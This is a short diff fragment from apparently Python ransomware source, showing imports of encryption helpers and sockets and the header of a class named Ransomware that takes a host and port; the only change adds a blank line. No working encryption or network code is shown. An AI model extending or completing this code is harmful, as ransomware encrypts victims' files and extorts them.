@@ -3,6 +3,7 @@ from modules.system import System
 from modules.crypto import Fernet, Encrypt, Decrypt
 from socket import socket, AF_INET, SOCK_STREAM
 
+
 class Ransomware:
     
     def __init__(self, host: str, port: int) -> None:
